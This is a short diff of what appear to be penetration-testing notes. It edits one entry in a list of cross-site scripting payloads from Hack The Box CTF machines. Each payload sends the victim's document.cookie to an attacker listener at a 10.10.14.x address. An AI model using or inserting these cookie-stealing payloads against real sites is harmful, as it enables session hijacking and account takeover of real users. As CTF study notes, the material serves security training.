@@ -145,7 +145,7 @@ Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
 
 Below are some example payloads from HTB ctfs:
 
-1. Headless: `<script>var i=new Image(); i.src="http://10.10.14.14:8000/?cookie="+btoa(document.cookie);</script>`
+1. Headless: `<script>var i=new Image(); i.src="http://10.10.14.12:1234/?cookie="+btoa(document.cookie);</script>`
 2. PermX: `<img src=x onerror="document.location='http://10.10.14.36:1234/?cookie=' + document.cookie"/>`
 3. Intuition: `<img src=x onerror="fetch('http://10.10.14.29:8000/?cookie='+document.cookie)">
 4. ICean: `<img src=x onerror="document.location='http://10.10.14.36:1234/?cookie=' + document.cookie"/>
